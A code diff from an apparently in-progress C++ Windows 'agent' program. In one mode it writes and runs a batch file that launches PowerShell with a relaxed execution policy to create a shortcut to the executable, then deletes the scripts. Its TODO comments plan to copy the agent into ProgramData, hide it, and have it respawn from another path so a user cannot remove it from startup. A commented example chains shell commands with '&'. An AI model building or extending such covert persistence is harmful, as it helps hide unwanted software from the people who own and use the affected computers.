@@ -8,13 +8,16 @@
 
 using namespace std;
 
-/*RUN COMMAND LINE
+/*RUN COMMAND LINE or .bat file and get output
 string command = "f";
+command += sourceExe;
+command += "calc & notepad"; // &: run two command, &&: run if before command done
+char *cmd = string_to_charstar(command);
 char *output = string_to_charstar(exec(cmd));
 */
 
 
-/*RUN SHELL
+/*RUN POWERSHELL COMMAND or .bat file (can't get output)
 
 // When using char strings
 ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_SHOW);
@@ -66,35 +69,29 @@ string exec(const char* cmd) {
 
 int main(int argc, char* argv[]) {
 
+	//TODO copy agent.exe in ProgramData then link to it
+	//TODO hide agent.exe
+	//TODO if user find agent as sturtup can fined all files so agent must run another agent in another path
 
-	//arg[0] is filename (filename.exe)
-	const char *fileLocation;
+	//arg[0] is filepath (C:\Temp\filename.exe)
+	//arg[1] is mode
 
 	if (argc == 3) {
 
-		fileLocation = argv[1];
-
+		const char *fileLocation = argv[1];
+		string sourceExe(fileLocation); //char* to string
 		
 		if (argv[2][0] == '1') {
 
-			
-
-			string sourceExe(fileLocation); //char* to string
-			
-			string command = "f";
-			command += sourceExe;
-			command = "calc & notepad"; // &: run two command, &&: run if before command done
-			//char *cmd = string_to_charstar(command);
-
 			ofstream myfile;
-			myfile.open("b.bat");
+			myfile.open("t.bat");
 			myfile << "@echo off\n"
-				"Powershell.exe -executionpolicy remotesigned -File  bb.ps1\n"
+				"Powershell.exe -executionpolicy remotesigned -File  tt.ps1\n"
 				//"set /p temp = \"Hit enter to continue\"\n"  //for dont close cmd
 				"exit / b"
 				;
 			myfile.close();
-			myfile.open("bb.ps1");
+			myfile.open("tt.ps1");
 			myfile << 
 				"$SourceExe = \"" 
 				<< sourceExe <<
@@ -106,20 +103,26 @@ int main(int argc, char* argv[]) {
 				"$Shortcut.Save()"
 				;
 			myfile.close();
-
-			int nRet = (int)ShellExecuteA(NULL, "open", "b.bat", NULL, NULL, SW_SHOW);
+			
+			int nRet = (int)ShellExecuteA(NULL, "open", "t.bat", NULL, NULL, SW_SHOW);
 			if (nRet > 32) {
 				//OK
 				//cout << "OK";
-				remove("b.bat");
-				remove("bb.ps1");
+				remove("t.bat");
+				remove("tt.ps1");
+
+				cout << "1 done.";
 			}
 			else {
 				//error
-
+				cout << "1 failed.";
 			}
+			
 
-			cout << "1 done.";
+			/*or use exec to get output
+				cout << exec("t.bat");
+			*/
+			
 			
 		}
 		else if (argv[2][0] == '2') {
